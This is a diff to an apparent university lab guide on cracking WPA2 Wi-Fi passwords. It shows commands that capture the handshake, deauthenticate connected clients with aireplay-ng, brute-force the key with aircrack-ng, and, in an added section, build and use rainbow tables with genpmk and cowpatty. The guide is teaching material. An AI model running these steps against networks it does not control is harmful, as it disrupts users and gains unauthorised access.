@@ -37,7 +37,7 @@ iw dev
    * `airodump-ng -c <NUM_CHANNEL> --bssid <AP_MAC_ADDRESS> -w <OUTPUT_FILE_CAPTURE> <INTERFACE_NAME_MONITOR_MODE>`
  * Our goal is to capture the **WPA2 handshake**. To do that, we try to de-authenticate all hosts connected to the AP using the `aireplay-ng` command; finally, we need to wait until at least one host will  auto reconnect to the AP
    * `aireplay-ng -0 2 -a <AP_MAC_ADDRESS> <INTERFACE_NAME_MONITOR_MODE>`
-![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/4.%20airodump-ng%20capture.png?raw=true)
+![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/4.%20handshake.png?raw=true)
 
  * Once the WPA2 handshake has been captured, we can start hacking the password 
 v
@@ -62,12 +62,33 @@ In our exercises, we will use some dictionaries which can be downloaded from the
 
 After that, the dictionaries can be found in the `/usr/share/john` and `/usr/share/rockyou` folders, respectively.
 
-## Start the bruteforce attack
+## Start a `Bruteforce` attack
 We can now start the bruteforce attack. We suggest to use `john` and/or `rockyou` dictionary to complete the exercise before the end of the laboratory session
 
  * `aircrack-ng -w <YOUR_DICTIONARY_FILE> <OUTPUT_FILE_CAPTURE>.cap`
 ![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/5.%20bruteforce.png?raw=true)
 
+## Start a `Rainbow Table` attack
+`Rainbow Tables` are pre-computed tables of hash values that are pre-matched to possible plain text passwords. Rainbow tables are mainly used to crack hashes very quickly.
+
+### Advantages of using Rainbow table
+ * Searching the rainbow table is very fast
+ * Once created, it does not require computing resources
+ * Once created, you can use it on multiple wireless access points
+
+### Disadvantages of using Rainbow table
+ * It takes up a lot of space, much more than just the password file
+ * The process of combining the password and the ESSID to create the PMK takes a good bit of time
+
+Computing rainbow tables takes exactly the same amount of time as a brute force, but searching the generated rainbow table takes a split second. So, if you want to test one handshake per an Access Point, then there is no difference between brute-force and using rainbow tables
+
+A `rainbow table` can be created using the `genpmk` command (starting from a dictionary) and can be used using `cowpatty` command
+ 1. `sudo su` 
+ 2. `apt install cowpatty`
+ 3. `genpmk -f <PATH_TO_DICTIONARY> -s <NETWORK_SSID> -d <OUTPUT_RAINBOW_TABLE>`
+
+Cowpatty can be executed in the following way
+ * `cowpatty -d <OUTPUT_RAINBOW_TABLE> -r <OUTPUT_FILE_CAPTURE> -s <<NETWORK_SSID>> -2`
 ## Stop Monitor Mode
 
 Remember to disable the **monitor mode** from your wireless network card
